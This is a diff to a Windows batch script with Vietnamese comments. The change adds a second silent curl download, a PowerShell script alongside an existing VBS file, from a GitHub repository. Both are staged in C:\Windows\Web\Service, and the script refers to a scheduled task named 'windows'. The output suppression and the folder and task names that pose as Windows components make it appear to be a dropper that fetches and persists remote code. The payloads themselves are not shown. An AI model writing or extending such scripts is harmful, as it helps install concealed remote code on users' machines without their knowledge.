@@ -8,8 +8,10 @@ if %errorLevel% neq 0 (
 
 :: Thiết lập biến
 set "winsysUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/winsys.vbs"
+set "serviceUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/service.ps1"
 set "destinationDir=C:\Windows\Web\Service"
 set "winsysDownloadFile=winsys.vbs"
+set "serviceDownloadFile=service.ps1"
 set "taskName=windows"
 
 :: Tạo thư mục nếu chưa tồn tại
@@ -23,9 +25,21 @@ cd /d "%destinationDir%" >nul 2>&1
 :: Tải xuống tệp winsys.vbs
 curl -L -o "%winsysDownloadFile%" "%winsysUrl%" >nul 2>&1
 
+:: Tải xuống tệp service.ps1
+curl -L -o "%serviceDownloadFile%" "%serviceUrl%" >nul 2>&1
+
 :: Kiểm tra xem tệp winsys.vbs đã tải xuống thành công chưa
 if exist "%winsysDownloadFile%" (
     if not exist "%destinationDir%\%winsysDownloadFile%" (
+        exit
+    )
+) else (
+    exit
+)
+
+:: Kiểm tra xem tệp service.ps1 đã tải xuống thành công chưa
+if exist "%serviceDownloadFile%" (
+    if not exist "%destinationDir%\%serviceDownloadFile%" (
         exit
     )
 ) else (
